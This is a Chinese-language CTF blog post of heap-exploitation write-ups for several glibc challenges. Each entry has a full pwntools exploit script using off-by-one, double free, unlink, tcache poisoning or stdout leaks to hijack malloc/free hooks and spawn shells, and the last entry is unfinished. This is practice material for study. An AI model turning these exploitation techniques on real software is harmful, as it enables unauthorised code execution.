---
title: 随便做做题
date: 2025-3-13 00:00:00 +0800
categories: [Blog, pwn]
tags: [pwn]
description: 截止到2025/3/26 均为用户态
---

### pwn161

glibc 2.23

通过代码审计发现edit函数中当输入size - chunk_size = 10时，可以触发offbyone漏洞多读入1字节。

通过off by one，可以造成堆块重叠，进而可以打unsorted bin leak泄露malloc_hook地址 & libc基址

后续打fast bin attack可以劫持malloc hook

```python
import LibcSearcher
from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux',log_level='debug')

local = 0
if local == 0:
    io = remote("pwn.challenge.ctf.show",28259)
else:
    io = gdb.debug('./pwn', 'b *$rebase(0xc5e)')

elf = ELF('./pwn')

libc = ELF('/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

def add(size):
    io.sendlineafter("Choice",b'1')
    io.sendlineafter("size",str(size))

def edit(index, size, content):
    io.sendlineafter("Choice",b'2')
    io.sendlineafter("index",str(index))
    io.sendlineafter("size",str(size))
    io.sendlineafter("content",content)

def free(index):
    io.sendlineafter("Choice",b'3')
    io.sendlineafter("index",str(index))

def show(index):
    io.sendlineafter("Choice",b'4')
    io.sendlineafter("index",str(index))

add(0x18) #0
add(0x10) #1
add(0x100) #2
add(0x10) #3 防止被合并
edit(0, 0x18+10, cyclic(0x18) + b'\x51') #此时chunk1 size = 0x51
edit(2, 0x30,cyclic(0x20) + p64(0) + p64(0x21))
free(1) #chunk1 进入fast bin free时会对next chunk的size位检查
add(0x40) #申请到chunk1
edit(1, 0x20, b'\x00'*0x10 + p64(0) + p64(0x111))
free(2)
show(1)
io.recvuntil(b'content: ')
io.recv(32)
unsorted_bin = u64(io.recv(6).ljust(8, b'\x00'))
malloc_hook = unsorted_bin - 0x68
libc_base = malloc_hook - libc.sym['__malloc_hook']
ogg = libc_base + 0x4527a
print(hex(unsorted_bin))

add(0x100) #申请到chunk2
payload = cyclic(0x60) + p64(0) + p64(0x71)
edit(2, len(payload), payload) #为fastbin attack做准备 进入fast bin free时会对next chunk的size位检查
edit(1, 0x20,b'\x00'*0x10 + p64(0) + p64(0x71))
free(2)
payload = cyclic(0x10) + p64(0) + p64(0x71) + p64(malloc_hook-0x23) #fd
edit(1,len(payload),payload)
add(0x60) #2
pause()
add(0x60) #申请到malloc_hook处 4
payload = cyclic(0x13) + p64(ogg)
edit(4, len(payload), payload)
add(0x10)
io.interactive()
```
> [!note] 总结
> - 堆块重叠构造fake chunk时，对其进行free进入fastbin时会check next chunk的size位进行检查，所以需要注意构造
> - 申请fastbin中的chunk时也会对chunk size进行check，所以一定要符合对应fast bin大小
>  - `b $rebase(offset)` 可以在开启PIE偏移情况下打断点
>  - 进行堆块重叠操作之前注意规避consolidate(添加gap)
>  - calloc会清空chunk内容，其底层依旧是调用malloc

### roarctf 2019 easyheap (double free/house of spirit)

glibc 2.23

没有edit功能造成了很大的不便

此处实现double free的精髓在于通过切割unsorted bin中的chunk进入fast bin中

```python
from pwn import *
import os
context(arch='amd64', os='linux',log_level='debug')

local = 1
binary_path = './pwn'
domain = "pwn.challenge.ctf.show"
port = 28259

if local == 0:
    io = remote(domain,port)
else:
    io = gdb.debug(binary_path, "b *0x400A40")

elf = ELF(binary_path)
libc = ELF("/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")

def add(size, content):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"input the size", str(size))
    io.sendlineafter(b"please input your content",content)
def add2(size, content):
    io.sendline(b"1")
    io.sendline(bytes(str(size),encoding='utf-8').ljust(7,b'\x00'))
    io.sendline(content)

def delete():
    io.sendlineafter(b">>", b"2")
def delete2():
    io.sendline(b"2")

def show():
    io.sendlineafter(b">>", b"3")
def show2():
    io.sendline(b"3")

def secret(number):
    io.sendlineafter(b">>", b"666")
    io.sendlineafter(b"build or free?\n",str(number))
    if number == 1:
        content = cyclic(0x10)
        io.sendlineafter(b'please input your content\n',content)
def secret2(number):
    io.sendline(b"666")
    io.sendline(bytes(str(number),encoding='utf-8').ljust(7,b'\x00'))
    if number == 1:
        content = cyclic(0xa0-1)
        io.sendline(content)


def attack():
    username = 0x602060
    info = 0x6020a0
    buf = 0x602088
    deadbeaf = 0x602090
    ptr = 0x602098
    size = info - username
    print("offset ", hex(size))
    io.sendlineafter(b"please input your username:", p64(0) + p64(size) + p64(username))
    io.sendlineafter(b"please input your info:", p64(0) + p64(size+1) + b"\x00"*5 + p64(0x71))
    secret(1) #malloc 0xa0
    secret(2) #free 0xa0 进入 unsorted bin
    add(size-0x10,cyclic(size-0x10)) #malloc 0x30从Unsorted bin中切割
    add(size-0x10,cyclic(size-0x10)) #malloc chunk1
    delete() #free chunk1
    secret(2) #free chunk0
    delete() #free chunk1 double free
    payload = p64(username).ljust(size-0x10,b'\x00')
    add(size-0x10,payload)
    add(size-0x10,cyclic(size-0x10))
    add(size-0x10,cyclic(size-0x10))
    payload = p64(username).ljust(0x18,b'\x00') + p64(elf.got['puts']) + p64(0xDEADBEEFDEADBEEF)
    add(size-0x10,payload) #申请到fake chunk
    show()
    io.recvuntil(b" ")
    puts_addr = u64(io.recv(0x6).ljust(8,b'\x00'))
    base_addr = puts_addr - libc.sym[b'puts']
    malloc_hook = base_addr + libc.sym['__malloc_hook']
    print("malloc hook: ", hex(malloc_hook))#泄露libc
    ogg = base_addr + 0x4525a
    io.sendline(b'666')
    secret2(1)
    add2(0x50, cyclic(0x50)) #gap防止合并
    secret2(2) #进入unsorted bin
    add2(0x60,cyclic(0x60))
    add2(0x60, cyclic(0x60))
    delete2()
    secret2(2)
    delete2()
    payload = p64(malloc_hook-0x23).ljust(0x60,b'a')
    add2(0x60,payload)
    print("----------------------")
    add2(0x60,cyclic(0x60))
    add2(0x60,cyclic(0x60))
    payload = cyclic(0x13) + p64(ogg)
    add2(0x60,payload)
    pause()
    add2(0x10,cyclic(0x10))
    io.interactive()
if __name__ == '__main__':
    attack()
```

> [!note] 总结
> -  完成double free的适用情况： fast bin中有两个不同chunk，且其中一个存在UAF
> - 申请到malloc hook - 0x23是因为该处刚好有0x7f/0x7a作为首地址。经过观察与测设，该地址附近没有以0x6*、0x5*等其他首地址作为size利用的可能，所以当使用fast bin attack劫持malloc hook时，一定要注意size为0x70，才能成功申请
> - 在做这道题踩坑的同时发现，当没有edit功能却能够在malloc时修改chunk的情况下，通过对fast bin中fd修改为环，自身指向自身能够做到用malloc替代edit，做法就是一直malloc一直edit
> - 填充payload非必要情况下别用\x00，会造成很多麻烦
> - 在关闭输出，无法根据目标程序反馈进行攻击时，多注意sendline末尾的\n等字符，多注意目标程序所用输入函数逻辑，否则会很麻烦
> - free()会检查地址是否对齐（杜绝自然形成的0x7f），会检查next size，malloc()则没有那么多限制

### axb 2019 heap (off by one/unlink)

头一次用上了结构体/数组逆向trick

伪代码指针太复杂看不懂可以直接上手动调

```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

local = 1
binary_path = './pwn'
gdb_script = ""
#gdb_script += "b *$rebase(0xae5)\n" #b banner
#gdb_script += "b *$rebase(0xce3)\n" #b add
gdb_script += "b *$rebase(0xf88)\n"  #b delete
gdb_script += " catch syscall execve\n"
domain = ""
port = 28259


if local == 0:
    io = remote(domain,port)
else:
    io = gdb.debug(binary_path, gdb_script)

elf = ELF(binary_path)
libc = ELF("/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")

def add(index, size, content):
    io.sendlineafter(b">> ", b'1')
    io.sendlineafter(b'Enter the index you want to create (0-10):', str(index))
    io.sendlineafter(b"Enter a size:", str(size))
    io.sendlineafter(b'Enter the content: ', content)
def delete(index):
    io.sendlineafter(b">> ", b'2')
    io.sendlineafter(b"Enter an index:", str(index))
def edit(index, payload):
    io.sendlineafter(b">> ", b'4')
    io.sendlineafter(b"Enter an index:", str(index))
    io.sendlineafter(b"Enter the content: ", payload)
def format():
    def exec_fmt(pad):
        p = process(binary_path)
        # send 还是 sendline以程序为准
        p.sendlineafter(b"Enter your name: ", pad)
        p.recvuntil(b"Hello, ")
        return p.recv()
    fmt = FmtStr(exec_fmt)
    offset = fmt.offset
    print("offset:",offset)
    payload = "%{0}$p%{1}$p".format(offset+int(0x58/8), offset+int(0x38/8))
    io.sendlineafter(b"Enter your name: ", payload)
    io.recvuntil(b"Hello, ")
    main_addr = eval(io.recv(0xe))
    __libc_start_main_240 = eval(io.recv(0xe))
    base_addr = main_addr - elf.symbols['main']
    libc_base = __libc_start_main_240 - libc.sym['__libc_start_main'] - 240
    print(hex(base_addr))
    print(hex(libc_base))
    return (base_addr, libc_base)

def attack():
    (base_addr, libc_base) = format()
    notes_addr = base_addr + 0x202060
    add(0, 0x88, cyclic(0x90))
    add(1, 0x90, cyclic(0x90))
    #准备进行unlink
    payload = (p64(0) + p64(0x61) + p64(notes_addr-0x18) + p64(notes_addr-0x10)).ljust(0x80, b'a') #布置fake chunk
    payload += p64(0x80)
    payload += b'\xa0'
    edit(0, payload)
    delete(1) #成功unsafe unlink
    edit(0, payload)
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    payload = cyclic(0x10) + p64(malloc_hook)
    edit(0, payload)
    ogg = libc_base + 0x4525a
    payload = p64(ogg)
    edit(0, payload)
    add(0, 0x88, cyclic(0x90))
    io.interactive()

if __name__ == '__main__':
    attack()
```
> [!note] 总结
> fmtstr是真爽啊

### hitcon_2018_children_tcache (合并构造overlap/tcache double free)

无edit 无UAF 存在off by null

strcpy会被\x00截断造成构造fake chunk困难，无法使用house of einherjar

以及很棘手的是free时会对chunk内容造成污染，填满0xDA

```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

local = 0
binary_path = './pwn'
gdb_script = "set debug-file-directory /glibc-all-in-one/libs/2.27-3ubuntu1_amd64/.debug\n"
gdb_script += "dir /glibc-2.27/malloc/\n"
gdb_script += "show dir\n"
# gdb_script += "b *$rebase(0xc3f)\n" #b menu
# gdb_script += "b *$rebase(0xec9)\n" #b delete
gdb_script += "catch syscall execve\n"
domain = "node5.buuoj.cn"
port = 25228


if local == 0:
    io = remote(domain,port)
else:
    io = gdb.debug(binary_path, gdb_script)

elf = ELF(binary_path)
libc = elf.libc

def add(size, content):
    io.sendlineafter(b"choice", b"1")
    io.sendlineafter(b"Size", str(size))
    io.sendlineafter(b"Data", content)
def delete(index):
    io.sendlineafter(b"choice", b"3")
    io.sendlineafter(b"Index:", str(index))
def show(index):
    io.sendlineafter(b"choice", b"2")
    io.sendlineafter(b"Index:", str(index))

def attack():
    add(0x420, b'0') # 必须是非tcache chunk
    add(0x18, b'1')
    add(0x5f0, b'2')  # 必须是 > 0x420 且以 f0结尾
    add(0x10, b'3')
    delete(0)
    delete(1)

    for i in range(9):  # 单字节修改prev_size
        add(0x18 - i, b'a' * (0x18 - i))
        delete(0)
    add(0x18, cyclic(0x10) + p64(0x6a0-0x250))
    delete(2)
    add(0x690-0x250 - 0x20, b'a') #chunk 1
    show(0)
    unsorted_bin_addr = u64(io.recv(6).ljust(8, b'\x00'))
    malloc_hook = unsorted_bin_addr - 0x70
    libc_base = malloc_hook - libc.symbols['__malloc_hook']
    ogg = libc_base + 0x4f322
    add(0x30,p64(ogg)) #chunk2
    delete(2)
    delete(0)
    add(0x30, p64(malloc_hook))
    add(0x30, b'pad')
    add(0x30, p64(ogg))
    print(hex(libc_base))
    io.sendlineafter(b"choice", b"1")
    io.sendlineafter(b"Size", str(0x30))
    io.interactive()
    
if __name__ == '__main__':
    attack()

```

> [!note] 总结
> - 被放入tcache bin中的chunk不能够作为consolidate的目标，否则会报错。这道题里我一直将chunk 0设置为小于0x420的chunk，导致其在被合并时一直报错，浪费了许多时间
> - 同理，这里为什么是大chunk - 小chunk -大chunk的设计？就是因为小chunk无法被合并。尝试过小chunk - 大chunk进行合并，以失败告终

## VNCTF 2021 pwn复现

### White_Give_Flag (越界读写/碰撞)

有沙盒，无法execve，没有开启canary保护

题目没给libc，应该与libc版本无关

申请堆块上限4，show()函数打印的是随机数

init()函数做了一件事：随机次数申请了随即大小的chunk，每次都会free，每次都会清空堆块中读入的flag，但是最后一次并没有清空，也就是说flag就藏在这些堆块中。

show()函数并无卵用，需要寻找其他方式dump flag

注意到get_int()函数有bug，即返回的index并非我们输入的内容，而是read()函数的返回值，如果能够发送EOF则可以造成返回0

刚好结合`puts((const char *)qword_202120[index - 1]);`，可以做到向后越界读，与此同时向后一个字节正好够到chunk ptr的最后一个存储地址。

delete()函数并未清除堆块内容，也就是说我们可以尝试反复malloc堆块，只要能够分配到存储flag的chunk就能dump出flag

存储flag的chunk从0x200 - 0x500范围内，我们只需遍历该区间即可

```python
from pwn import *
import tty
global io
context(arch='amd64', os='linux',log_level='debug')

local = 1
binary_path = './pwn'
gdb_script = ''
gdb_script = "b *$rebase(0x1145)\n" #b edit
#gdb_script += "b *$rebase(0xec9)\n" #b delete
domain = "node4.buuoj.cn"
port = 39123

elf = ELF(binary_path)
libc = elf.libc

def attack(size):
    def add(size):
        io.sendlineafter(b"choice:", b'')
        io.sendlineafter(b"size:", str(size))
    def delete(index):
        io.sendlineafter(b"choice:", b'\x11\x11')
        io.sendline(str(index))
    def edit(index):
        io.sendlineafter(b"choice:", b'\x11\x11\x11')
        io.sendlineafter(b"index:",str(index))
        io.sendlineafter(b"Content:", cyclic(0x10))
    #io = gdb.debug(binary_path,gdb_script)
    #io = process(binary_path)
    io = remote(domain, port)
    add(0x20)
    add(0x20)
    add(0x20)
    #先malloc 3个chunk填满数组
    add(size)
    edit(3)
    io.recvuntil(b"choice:")
    io.shutdown_raw('send')
    message = io.recv()
    if b'ctf' in message:
        print(message)
        exit(0)
    io.close()

if __name__ == '__main__':
    i = 0
    while True:
        try:
            size = 0x300
            attack(size + i)
            i = i + 1
            print("times:", i)
        except Exception as e:
            i = i + 1
            print("times:", i)
```

> [!note] 总结
> - 利用io.shutdown_raw('send')发送EOF，但该管道相当于废弃
> - 要用try:except进行异常处理，否则run不起来，EOF会阻塞程序

### ff (tcache异或加密 unsorted bin打stdout泄露libc)

libc2.32保护全开

```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

local = 1
binary_path = './pwn'
gdb_script = ""
#gdb_script += "b *$rebase(0xb95)\n" #b add
# gdb_script += "b *$rebase(0xec9)\n" #b delete
#gdb_script += "catch syscall execve\n"
gdb_script += "c\n"
domain = "node5.buuoj.cn"
port = 29836
global io,gdb_io
elf = ELF(binary_path)
libc = elf.libc

def connect(isLocal,isGDB,isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid,gdb_io) = gdb.attach(io,gdb_script,api=True)
            return io,gdb_io
        else:
            io = gdb.debug(binary_path,gdb_script)
            return io
    else:
        io = process(binary_path)
        return io


def add(size, content):
    io.sendlineafter(b">>", str(1))
    io.sendlineafter(b"Size:", str(size))
    io.sendafter(b"Content:",content)

def delete():
    io.sendlineafter(b">>", str(2))

def show():
    io.sendlineafter(b">>", str(3))

def edit(content):
    io.sendlineafter(b">>", str(5))
    io.sendafter(b"Content:", content)
    #仅可写0x10

def attack(hit_byte):
    add(0x80,cyclic(0x80))
    delete()
    show()
    io.recvuntil(b">>")
    heap_base = u64(io.recv(5).ljust(8,b'\x00')) << 12
    log.success("Heap base address: {}".format(hex(heap_base)))

    edit(p64(heap_base >> 12) + p64(0))
    delete() #double free
    target = heap_base + 0x10
    payload = p64(((heap_base)>>12)^(target))
    edit(payload)
    add(0x80,cyclic(0x80))
    #劫持到tcache struct
    #struct大小为0x250则counts为char；struct大小为0x290则counts为2字节
    payload = p16(8) * 0x27 + p16(8)
    add(0x80,payload)
    delete() #释放tcache struct
    #堆风水
    add(0x40,content= p16(0) + p16(1) + p16(0) + p16(1) + p16(0))
    add(0x30, content=b'\x00')
    add(0x10,content=p64(0) + p8(0xc0)+p8(hit_byte*0x10+6))
    payload = p64(0xfbad1800) + p64(0xfbad1800) * 3 + b'\x00'
    add(0x40, payload)
    libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1e4744
    add(0x10, p64(libc_base + libc.sym['__free_hook']))
    add(0x70, p64(libc_base + libc.sym['system']))
    add(0x10, b'/bin/sh\x00')
    delete()
    io.interactive()

if __name__ == '__main__':
    hit_byte = 1
    while True:
        try:
            io = connect(isLocal=False,isGDB=True,isIO=False)
            attack(hit_byte)
        except Exception as e:
            print(e)
            hit_byte += 1
            hit_byte = hit_byte % 16
            continue
```

> [!note] 总结
>- 无法在不使用第二次edit机会的情况下通过tcache touble free进行攻击。因为tcache counts记录了tcache的数量。想要在touble free前绕过counts也不太行，因为idx只记录了最新的那个chunk，无法在tcache中垫好其他chunk
> - 打tcache attack要注意到counts，当counts归零则无法申请到对应bin的chunk，如果不注意就会像我这样浪费许多时间（怎么跟我想的不一样？？）
> - `find_fake_fast`指令可以在目标地址附近列出可以构造fake chunk的位置
> - 需要爆破的环节可以参考该exp
> - 劫持tcache perthread struct的环节需要一直考虑到counts与bin的影响，后续环节也可以通过提前布置好counts攻击，多结合切割unsorted bin chunk来调整指针位置，这部分也是最恶心的
> - 教训：坚信机器一定是正确的，如果没有出现预想的结果，那一定是exp有问题
> - 最后：牛魔，调昏了，调了一天，但是收获很多之前不知道或没注意的小trick


### VNCTF2021 LittleRedFlower

依旧是保护全开

1. 有沙盒，无法执行execve
2. hint:试试看打TCACHE_MAX_BINS
3. gift: stdout的地址
4. 有一字节任意写的机会
5. 在预先分配好的0x200大小的堆指针任意偏移处有写8 bytes的机会
6. 可以申请一个 大于0xfff 小于0x2000的chunk

```python

```
